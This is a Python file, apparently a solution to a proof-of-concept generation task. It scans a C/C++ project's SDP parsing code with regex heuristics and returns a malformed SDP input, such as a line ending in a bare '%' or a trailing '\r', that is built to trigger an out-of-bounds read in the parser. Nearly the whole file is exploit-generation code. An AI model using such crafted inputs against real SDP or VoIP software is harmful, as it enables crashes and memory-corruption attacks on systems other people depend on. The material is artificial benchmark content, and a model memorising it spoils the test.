import os
import re
import tarfile
import tempfile
from typing import Iterable, Tuple


class Solution:
    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> str:
        with tarfile.open(tar_path, "r:*") as tf:
            members = tf.getmembers()
            for m in members:
                name = m.name
                if not name or name.startswith("/") or name.startswith("\\"):
                    continue
                norm = os.path.normpath(name)
                if norm.startswith("..") or norm.startswith("../") or norm.startswith("..\\"):
                    continue
                m.name = norm
                tf.extract(m, path=dst_dir)
        return dst_dir

    def _iter_source_files(self, root: str) -> Iterable[str]:
        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp", ".inl")
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                if fn.endswith(exts):
                    yield os.path.join(dirpath, fn)

    def _choose_scan_files(self, root: str) -> Iterable[str]:
        files = list(self._iter_source_files(root))
        sdp_files = [p for p in files if "sdp" in p.lower().replace("\\", "/")]
        if sdp_files:
            return sdp_files
        return files

    def _scan_project(self, root: str) -> Tuple[bool, bool, bool]:
        crlf = False
        percent = False
        cr_lookahead = False

        # Heuristics:
        # - CRLF usage: "\r\n" literal or '\r' handling
        # - Percent decoding: checks for '%' and reads lookahead (+1/+2) or isxdigit/hex usage
        # - CR lookahead: '\r' and (i+1)/(pos+1) compared to '\n'
        rx_percent_lookahead = re.compile(
            br"[%]\s*['\"]?\s*[\)\]]?\s*.*?(\+\s*1|\+\s*2|\+\s*3|pos\s*\+\s*1|pos\s*\+\s*2|i\s*\+\s*1|i\s*\+\s*2)",
            re.DOTALL,
        )
        rx_crlf_lit = re.compile(br"\\r\\n|'\r'|\"\r\n\"|'\n'\s*&&\s*'\r'", re.DOTALL)
        rx_cr_lookahead = re.compile(
            br"'\r'.{0,200}(\+\s*1|pos\s*\+\s*1|i\s*\+\s*1).{0,200}'\n'",
            re.DOTALL,
        )

        for path in self._choose_scan_files(root):
            try:
                with open(path, "rb") as f:
                    data = f.read(2_000_000)
            except Exception:
                continue

            low = data.lower()

            if not crlf and rx_crlf_lit.search(data):
                crlf = True

            if not cr_lookahead and rx_cr_lookahead.search(data):
                cr_lookahead = True

            if not percent:
                if b"%" in data and (b"isxdigit" in low or b"hex" in low or b"unescape" in low or b"percent" in low):
                    if rx_percent_lookahead.search(data) or b"+2" in low or b"+ 2" in low or b"pos+2" in low or b"i+2" in low:
                        percent = True

            if crlf and percent and cr_lookahead:
                break

        return crlf, percent, cr_lookahead

    def _build_poc_percent(self, sep: bytes) -> bytes:
        lines = [
            b"v=0",
            b"o=- 0 0 IN IP4 127.0.0.1",
            b"s=-",
            b"t=0 0",
            b"m=audio 9 RTP/AVP 0",
            b"c=IN IP4 0.0.0.0",
            b"a=rtpmap:0 PCMU/8000",
            b"u=%",
            b"a=extmap:1 %",  # last char is '%'
        ]
        return sep.join(lines[:-1]) + sep + lines[-1]

    def _build_poc_cr_lookahead(self) -> bytes:
        # Minimal trailing '\r' intended to trigger lookahead for '\n' without bounds check.
        return b"v=0\r"

    def solve(self, src_path: str) -> bytes:
        root = None
        tmpdir = None
        try:
            if os.path.isdir(src_path):
                root = src_path
            else:
                tmpdir = tempfile.mkdtemp(prefix="poc_sdp_")
                self._safe_extract_tar(src_path, tmpdir)
                root = tmpdir

            crlf, percent, cr_lookahead = self._scan_project(root)
            sep = b"\r\n" if crlf else b"\n"

            if percent:
                return self._build_poc_percent(sep)

            if cr_lookahead:
                return self._build_poc_cr_lookahead()

            # Fallback: common SDP with a trailing '\r' to stress end checks.
            base = sep.join(
                [
                    b"v=0",
                    b"o=- 0 0 IN IP4 127.0.0.1",
                    b"s=-",
                    b"t=0 0",
                    b"u=%",
                ]
            )
            if crlf:
                return base + b"\r"
            return base + b"\n"
        except Exception:
            return b"v=0\r"
        finally:
            if tmpdir is not None:
                try:
                    for dirpath, dirnames, filenames in os.walk(tmpdir, topdown=False):
                        for fn in filenames:
                            try:
                                os.remove(os.path.join(dirpath, fn))
                            except Exception:
                                pass
                        for dn in dirnames:
                            try:
                                os.rmdir(os.path.join(dirpath, dn))
                            except Exception:
                                pass
                    try:
                        os.rmdir(tmpdir)
                    except Exception:
                        pass
                except Exception:
                    pass